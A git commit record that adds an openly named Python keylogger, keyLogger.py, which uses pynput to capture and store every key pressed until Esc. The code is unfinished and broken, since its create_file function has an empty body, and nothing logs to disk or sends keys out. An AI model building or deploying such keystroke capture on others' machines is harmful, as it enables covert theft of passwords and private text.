fc9094d472e651b9dbbda90409ee9e6d25c488d0
Pete Siravo <p.siravojr@gmail.com>
2019-11-10 16:58:59 -0500

    update keyLogger

--- keyLogger.py
+++ keyLogger.py
@@ -1,1 +1,20 @@
 import sys
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+keysPressed = []
+
+def on_press(key):
+    global keysPressed
+
+    if key == Key.esc:
+        return False
+
+    keysPressed.append(key)
+
+def create_file(keysPressed):
+    
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
